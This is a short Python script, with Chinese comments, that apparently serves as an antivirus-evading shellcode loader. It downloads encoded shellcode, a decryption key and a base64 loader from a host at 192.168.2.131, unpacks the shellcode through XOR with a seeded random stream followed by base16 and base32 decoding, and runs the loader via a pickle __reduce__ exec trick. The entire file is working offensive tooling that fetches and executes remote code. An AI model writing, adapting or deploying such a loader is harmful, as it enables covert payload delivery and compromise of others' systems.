# -*- coding: UTF-8 -*-
import ctypes
import base64
import random
import pickle
from sys import version_info
if version_info >= (3,0):
    from urllib.request import urlopen
else:
    from urllib2 import urlopen


def decrypt(code, key):
    # 设置随机数
    random.seed(key)
    # 异或解密
    xor_code = code.split('.')
    res_code = ''
    for i in xor_code:
        res_code = res_code + chr(int(i) ^ random.randint(0, 255))
    # 三重解码
    if version_info >= (3,0):
        shellcode = bytes.fromhex(res_code)
    else:
        shellcode = res_code.decode('hex')
    shellcode = base64.b16decode(shellcode)
    shellcode = base64.b32decode(shellcode)
    return shellcode


class Runcode(object):
    def __init__(self, sc, ld):
        global shellcode
        global loader
        loader = ld
        shellcode = sc
        
    def __reduce__(self):
        return (exec, (loader,))


def get_data(url_shellcode, url_key, url_loader):
    """远程获取shellcode"""
    # 远程加载shellcode, key
    key = urlopen(url_key).read().decode()
    shellcode = urlopen(url_shellcode).read().decode()
    loader = urlopen(url_loader).read().decode()
    loader = base64.b64decode(loader)
    return shellcode, key, loader


if __name__ == "__main__":
    url_shellcode = "http://192.168.2.131/shellcode.txt"
    url_key = "http://192.168.2.131/key.txt"
    url_loader = "http://192.168.2.131/loader.txt"
    # 远程加载
    shellcode, key, loader = get_data(url_shellcode, url_key, url_loader)
    # 解码
    shellcode = decrypt(shellcode, key)
    # 加载shellcode
    res = pickle.dumps(Runcode(shellcode, loader))
    pickle.loads(res)
